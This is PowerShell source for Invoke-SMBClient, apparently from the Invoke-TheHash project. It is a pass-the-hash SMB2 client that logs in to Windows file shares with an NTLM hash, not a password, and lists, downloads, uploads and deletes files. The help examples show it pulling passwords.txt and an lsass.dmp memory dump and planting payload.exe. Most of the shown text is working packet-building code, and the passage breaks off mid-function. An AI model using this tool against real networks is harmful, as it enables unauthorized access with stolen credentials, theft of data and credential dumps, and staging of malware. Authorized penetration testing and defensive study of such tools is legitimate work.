function Invoke-SMBClient
{
<#
.SYNOPSIS
Invoke-SMBClient performs basic file share tasks with pass the hash. This module supports SMB2 (2.1) only with and
without SMB signing. Note that this client is slow compared to the Windows client.

.PARAMETER Username
Username to use for authentication.

.PARAMETER Domain
Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the
username. 

.PARAMETER Hash
NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.

.Parameter Action
Default = List: (List/Recurse/Delete/Get/Put) Action to perform. 
List: Lists the contents of a directory.
Recurse: Lists the contents of a directory and all subdirectories.
Delete: Deletes a file.
Get: Downloads a file.
Put: Uploads a file and sets the creation, access, and last write times to match the source file.

.PARAMETER Source
List and Recurse: UNC path to a directory.
Delete: UNC path to a file.
Get: UNC path to a file.
Put: File to upload. If a full path is not specified, the file must be in the current directory. When using the
'Modify' switch, 'Source' must be a byte array.

.PARAMETER Destination
List and Recurse: Not used.
Delete: Not used.
Get: If used, value will be the new filename of downloaded file. If a full path is not specified, the file will be
created in the current directory.
Put: UNC path for uploaded file. The filename must be specified.

.PARAMETER Modify
List and Recurse: The function will output an object consisting of directory contents.
Delete: Not used.
Get: The function will output a byte array of the downloaded file instead of writing the file to disk. It's
advisable to use this only with smaller files and to send the output to a variable.
Put: Uploads a byte array to a new destination file.

.PARAMETER NoProgress
List and Recurse: Not used.
Delete: Not used.
Get and Put: Prevents displaying of a progress bar.

.PARAMETER Sleep
Default = 100 Milliseconds: Sets the function's Start-Sleep values in milliseconds. You can try increasing this
if downloaded files are being corrupted.

.EXAMPLE
List the contents of a root share directory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Source \\server\share -verbose

.EXAMPLE
Recursively list the contents of a share starting at the root.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share

.EXAMPLE
Recursively list the contents of a share subdirectory and return only the contents output to a variable.
$directory_contents = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Recurse -Source \\server\share\subdirectory -Modify

.EXAMPLE
Delete a file on a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\payload.exe

.EXAMPLE
Delete a file in subdirectories within a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Delete -Source \\server\share\subdirectory\subdirectory\payload.exe

.EXAMPLE
Download a file from a share.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt

.EXAMPLE
Download a file from within a share subdirectory and set a new filename.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\subdirectory\lsass.dmp -Destination server_lsass.dmp

.EXAMPLE
Download a file from a share to a byte array variable instead of disk.
$password_file = Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Get -Source \\server\share\passwords.txt -Modify

.EXAMPLE
Upload a file to a share subdirectory.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source payload.exe -Destination \\server\share\subdirectory\payload.exe

.EXAMPLE
Upload a file to share from a byte array variable.
Invoke-SMBClient -Domain TESTDOMAIN -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Action Put -Source $file_byte_array -Destination \\server\share\file.docx -Modify

.LINK
https://github.com/Kevin-Robertson/Invoke-TheHash

#>
[CmdletBinding()]
param
(
    [parameter(Mandatory=$false)][ValidateSet("List","Recurse","Get","Put","Delete")][String]$Action = "List",
    [parameter(Mandatory=$false)][String]$Destination,
    [parameter(Mandatory=$true)][String]$Username,
    [parameter(Mandatory=$false)][String]$Domain,
    [parameter(Mandatory=$true)][Object]$Source,
    [parameter(Mandatory=$true)][ValidateScript({$_.Length -eq 32 -or $_.Length -eq 65})][String]$Hash,
    [parameter(Mandatory=$false)][Switch]$Modify,
    [parameter(Mandatory=$false)][Switch]$NoProgress,
    [parameter(Mandatory=$false)][Int]$Sleep=100
)

function ConvertFrom-PacketOrderedDictionary
{
    param($packet_ordered_dictionary)

    ForEach($field in $packet_ordered_dictionary.Values)
    {
        $byte_array += $field
    }

    return $byte_array
}

#NetBIOS

function Get-PacketNetBIOSSessionService()
{
    param([Int]$packet_header_length,[Int]$packet_data_length)

    [Byte[]]$packet_netbios_session_service_length = [System.BitConverter]::GetBytes($packet_header_length + $packet_data_length)
    $packet_NetBIOS_session_service_length = $packet_netbios_session_service_length[2..0]

    $packet_NetBIOSSessionService = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Message_Type",[Byte[]](0x00))
    $packet_NetBIOSSessionService.Add("NetBIOSSessionService_Length",[Byte[]]($packet_netbios_session_service_length))

    return $packet_NetBIOSSessionService
}

#SMB1

function Get-PacketSMBHeader()
{
    param([Byte[]]$packet_command,[Byte[]]$packet_flags,[Byte[]]$packet_flags2,[Byte[]]$packet_tree_ID,[Byte[]]$packet_process_ID,[Byte[]]$packet_user_ID)

    $packet_SMBHeader = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBHeader.Add("SMBHeader_Protocol",[Byte[]](0xff,0x53,0x4d,0x42))
    $packet_SMBHeader.Add("SMBHeader_Command",$packet_command)
    $packet_SMBHeader.Add("SMBHeader_ErrorClass",[Byte[]](0x00))
    $packet_SMBHeader.Add("SMBHeader_Reserved",[Byte[]](0x00))
    $packet_SMBHeader.Add("SMBHeader_ErrorCode",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("SMBHeader_Flags",$packet_flags)
    $packet_SMBHeader.Add("SMBHeader_Flags2",$packet_flags2)
    $packet_SMBHeader.Add("SMBHeader_ProcessIDHigh",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("SMBHeader_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMBHeader.Add("SMBHeader_Reserved2",[Byte[]](0x00,0x00))
    $packet_SMBHeader.Add("SMBHeader_TreeID",$packet_tree_ID)
    $packet_SMBHeader.Add("SMBHeader_ProcessID",$packet_process_ID)
    $packet_SMBHeader.Add("SMBHeader_UserID",$packet_user_ID)
    $packet_SMBHeader.Add("SMBHeader_MultiplexID",[Byte[]](0x00,0x00))

    return $packet_SMBHeader
}

function Get-PacketSMBNegotiateProtocolRequest()
{
    param([String]$packet_version)

    if($packet_version -eq 'SMB1')
    {
        [Byte[]]$packet_byte_count = 0x0c,0x00
    }
    else
    {
        [Byte[]]$packet_byte_count = 0x22,0x00  
    }

    $packet_SMBNegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_WordCount",[Byte[]](0x00))
    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_ByteCount",$packet_byte_count)
    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat",[Byte[]](0x02))
    $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name",[Byte[]](0x4e,0x54,0x20,0x4c,0x4d,0x20,0x30,0x2e,0x31,0x32,0x00))

    if($packet_version -ne 'SMB1')
    {
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat2",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name2",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x30,0x30,0x32,0x00))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_BufferFormat3",[Byte[]](0x02))
        $packet_SMBNegotiateProtocolRequest.Add("SMBNegotiateProtocolRequest_RequestedDialects_Dialect_Name3",[Byte[]](0x53,0x4d,0x42,0x20,0x32,0x2e,0x3f,0x3f,0x3f,0x00))
    }

    return $packet_SMBNegotiateProtocolRequest
}

#SMB2

function Get-PacketSMB2Header()
{
    param([Byte[]]$packet_command,[Byte[]]$packet_credit_request,[Int]$packet_message_ID,[Byte[]]$packet_tree_ID,[Byte[]]$packet_session_ID)

    [Byte[]]$packet_message_ID = [System.BitConverter]::GetBytes($packet_message_ID) + 0x00,0x00,0x00,0x00

    $packet_SMB2Header = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2Header.Add("SMB2Header_ProtocolID",[Byte[]](0xfe,0x53,0x4d,0x42))
    $packet_SMB2Header.Add("SMB2Header_StructureSize",[Byte[]](0x40,0x00))
    $packet_SMB2Header.Add("SMB2Header_CreditCharge",[Byte[]](0x01,0x00))
    $packet_SMB2Header.Add("SMB2Header_ChannelSequence",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("SMB2Header_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2Header.Add("SMB2Header_Command",$packet_command)
    $packet_SMB2Header.Add("SMB2Header_CreditRequest",$packet_credit_request)
    $packet_SMB2Header.Add("SMB2Header_Flags",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("SMB2Header_NextCommand",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("SMB2Header_MessageID",$packet_message_ID)
    $packet_SMB2Header.Add("SMB2Header_ProcessID",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2Header.Add("SMB2Header_TreeID",$packet_tree_ID)
    $packet_SMB2Header.Add("SMB2Header_SessionID",$packet_session_ID)
    $packet_SMB2Header.Add("SMB2Header_Signature",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

    return $packet_SMB2Header
}

function Get-PacketSMB2NegotiateProtocolRequest()
{
    $packet_SMB2NegotiateProtocolRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_StructureSize",[Byte[]](0x24,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_DialectCount",[Byte[]](0x02,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_SecurityMode",[Byte[]](0x01,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Capabilities",[Byte[]](0x40,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_ClientGUID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextOffset",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_NegotiateContextCount",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Reserved2",[Byte[]](0x00,0x00))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect",[Byte[]](0x02,0x02))
    $packet_SMB2NegotiateProtocolRequest.Add("SMB2NegotiateProtocolRequest_Dialect2",[Byte[]](0x10,0x02))

    return $packet_SMB2NegotiateProtocolRequest
}

function Get-PacketSMB2SessionSetupRequest()
{
    param([Byte[]]$packet_security_blob)

    [Byte[]]$packet_security_blob_length = [System.BitConverter]::GetBytes($packet_security_blob.Length)
    $packet_security_blob_length = $packet_security_blob_length[0,1]

    $packet_SMB2SessionSetupRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_StructureSize",[Byte[]](0x19,0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Flags",[Byte[]](0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityMode",[Byte[]](0x01))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Capabilities",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Channel",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferOffset",[Byte[]](0x58,0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_SecurityBufferLength",$packet_security_blob_length)
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_PreviousSessionID",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2SessionSetupRequest.Add("SMB2SessionSetupRequest_Buffer",$packet_security_blob)

    return $packet_SMB2SessionSetupRequest 
}

function Get-PacketSMB2TreeConnectRequest()
{
    param([Byte[]]$packet_path)

    [Byte[]]$packet_path_length = [System.BitConverter]::GetBytes($packet_path.Length)
    $packet_path_length = $packet_path_length[0,1]

    $packet_SMB2TreeConnectRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_StructureSize",[Byte[]](0x09,0x00))
    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathOffset",[Byte[]](0x48,0x00))
    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_PathLength",$packet_path_length)
    $packet_SMB2TreeConnectRequest.Add("SMB2TreeConnectRequest_Buffer",$packet_path)

    return $packet_SMB2TreeConnectRequest
}

function Get-PacketSMB2IoctlRequest()
{
    param([Byte[]]$packet_file_name)

    $packet_file_name_length = [System.BitConverter]::GetBytes($packet_file_name.Length + 2)

    $packet_SMB2IoctlRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_Reserved",[Byte[]](0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_Function",[Byte[]](0x94,0x01,0x06,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_GUIDHandle",[Byte[]](0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff,0xff))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_InData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_InData_Length",$packet_file_name_length)
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_MaxIoctlInSize",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_OutData_Offset",[Byte[]](0x78,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_OutData_Length",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_MaxIoctlOutSize",[Byte[]](0x00,0x10,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_Flags",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_InData_MaxReferralLevel",[Byte[]](0x04,0x00))
    $packet_SMB2IoctlRequest.Add("SMB2IoctlRequest_InData_FileName",$packet_file_name)

    return $packet_SMB2IoctlRequest
}

function Get-PacketSMB2CreateRequest()
{
    param([Byte[]]$packet_file_name,[Int]$packet_extra_info,[Int64]$packet_allocation_size)

    if($packet_file_name)
    {
        $packet_file_name_length = [System.BitConverter]::GetBytes($packet_file_name.Length)
        $packet_file_name_length = $packet_file_name_length[0,1]
    }
    else
    {
        $packet_file_name = 0x00,0x00,0x69,0x00,0x6e,0x00,0x64,0x00
        $packet_file_name_length = 0x00,0x00
    }

    if($packet_extra_info)
    {
        [Byte[]]$packet_desired_access = 0x80,0x00,0x10,0x00
        [Byte[]]$packet_file_attributes = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_share_access = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_create_options = 0x21,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_offset = [System.BitConverter]::GetBytes($packet_file_name.Length)

        if($packet_extra_info -eq 1)
        {
            [Byte[]]$packet_create_contexts_length = 0x58,0x00,0x00,0x00
        }
        elseif($packet_extra_info -eq 2)
        {
            [Byte[]]$packet_create_contexts_length = 0x90,0x00,0x00,0x00
        }
        else
        {
            [Byte[]]$packet_create_contexts_length = 0xb0,0x00,0x00,0x00
            [Byte[]]$packet_allocation_size_bytes = [System.BitConverter]::GetBytes($packet_allocation_size)
        }

        if($packet_file_name)
        {

            [String]$packet_file_name_padding_check = $packet_file_name.Length / 8

            if($packet_file_name_padding_check -like "*.75")
            {
                $packet_file_name += 0x04,0x00
            }
            elseif($packet_file_name_padding_check -like "*.5")
            {
                $packet_file_name += 0x00,0x00,0x00,0x00
            }
            elseif($packet_file_name_padding_check -like "*.25")
            {
               $packet_file_name += 0x00,0x00,0x00,0x00,0x00,0x00
            }

        }

        [Byte[]]$packet_create_contexts_offset = [System.BitConverter]::GetBytes($packet_file_name.Length + 120)

    }
    else
    {
        [Byte[]]$packet_desired_access = 0x03,0x00,0x00,0x00
        [Byte[]]$packet_file_attributes = 0x80,0x00,0x00,0x00
        [Byte[]]$packet_share_access = 0x01,0x00,0x00,0x00
        [Byte[]]$packet_create_options = 0x40,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_offset = 0x00,0x00,0x00,0x00
        [Byte[]]$packet_create_contexts_length = 0x00,0x00,0x00,0x00
    }

    $packet_SMB2CreateRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_StructureSize",[Byte[]](0x39,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_Flags",[Byte[]](0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_RequestedOplockLevel",[Byte[]](0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_Impersonation",[Byte[]](0x02,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_SMBCreateFlags",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_Reserved",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_DesiredAccess",$packet_desired_access)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_FileAttributes",$packet_file_attributes)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ShareAccess",$packet_share_access)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_CreateDisposition",[Byte[]](0x01,0x00,0x00,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_CreateOptions",$packet_create_options)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_NameOffset",[Byte[]](0x78,0x00))
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_NameLength",$packet_file_name_length)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_CreateContextsOffset",$packet_create_contexts_offset)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_CreateContextsLength",$packet_create_contexts_length)
    $packet_SMB2CreateRequest.Add("SMB2CreateRequest_Buffer",$packet_file_name)

    if($packet_extra_info)
    {
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_ChainOffset",[Byte[]](0x28,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Data_Length",[Byte[]](0x10,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Tag",[Byte[]](0x44,0x48,0x6e,0x51))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementDHnQ_Data_GUIDHandle",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))

        if($packet_extra_info -eq 3)
        {
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_ChainOffset",[Byte[]](0x20,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Tag_Offset",[Byte[]](0x10,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Data_Offset",[Byte[]](0x18,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Data_Length",[Byte[]](0x08,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Tag",[Byte[]](0x41,0x6c,0x53,0x69))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_Unknown",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementAlSi_AllocationSize",$packet_allocation_size_bytes)
        }

        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Tag",[Byte[]](0x4d,0x78,0x41,0x63))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementMxAc_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($packet_extra_info -gt 1)
        {
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x18,0x00,0x00,0x00))
        }
        else
        {
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
        }
        
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Tag_Offset",[Byte[]](0x10,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Data_Offset",[Byte[]](0x18,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Data_Length",[Byte[]](0x00,0x00,0x00,0x00))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Tag",[Byte[]](0x51,0x46,0x69,0x64))
        $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementQFid_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

        if($packet_extra_info -gt 1)
        {
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_ChainOffset",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Tag_Offset",[Byte[]](0x10,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Tag_Length",[Byte[]](0x04,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Offset",[Byte[]](0x18,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Length",[Byte[]](0x20,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Tag",[Byte[]](0x52,0x71,0x4c,0x73))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Unknown",[Byte[]](0x00,0x00,0x00,0x00))

            if($packet_extra_info -eq 2)
            {
                $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0xb0,0x1d,0x02,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }
            else
            {
                $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Lease_Key",[Byte[]](0x10,0x90,0x64,0x01,0xa0,0xf8,0xff,0xff,0x47,0x78,0x67,0x02,0x00,0x00,0x00,0x00))
            }

            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Lease_State",[Byte[]](0x07,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Lease_Flags",[Byte[]](0x00,0x00,0x00,0x00))
            $packet_SMB2CreateRequest.Add("SMB2CreateRequest_ExtraInfo_ChainElementRqLs_Data_Lease_Duration",[Byte[]](0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00))
        }

    }

    return $packet_SMB2CreateRequest
}

function Get-PacketSMB2FindRequestFile()
{
    param ([Byte[]]$packet_file_ID,[Byte[]]$packet_padding)

    $packet_SMB2FindRequestFile = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_StructureSize",[Byte[]](0x21,0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_InfoLevel",[Byte[]](0x25))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_Flags",[Byte[]](0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_FileIndex",[Byte[]](0x00,0x00,0x00,0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_FileID",$packet_file_ID)
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Offset",[Byte[]](0x60,0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern_Length",[Byte[]](0x02,0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_OutputBufferLength",[Byte[]](0x00,0x00,0x01,0x00))
    $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_SearchPattern",[Byte[]](0x2a,0x00))

    if($packet_padding)
    {
        $packet_SMB2FindRequestFile.Add("SMB2FindRequestFile_Padding",$packet_padding)
    }

    return $packet_SMB2FindRequestFile
}

function Get-PacketSMB2QueryInfoRequest()
{
    param ([Byte[]]$packet_info_type,[Byte[]]$packet_file_info_class,[Byte[]]$packet_output_buffer_length,[Byte[]]$packet_input_buffer_offset,[Byte[]]$packet_file_ID,[Int]$packet_buffer)

    [Byte[]]$packet_buffer_bytes = ,0x00 * $packet_buffer

    $packet_SMB2QueryInfoRequest = New-Object System.Collections.Specialized.OrderedDictionary
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_StructureSize",[Byte[]](0x29,0x00))
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_InfoType",$packet_info_type)
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_FileInfoClass",$packet_file_info_class)
    $packet_SMB2QueryInfoRequest.Add("SMB2QueryInfoRequest_OutputBufferLength",$packet_output_buffer_length)
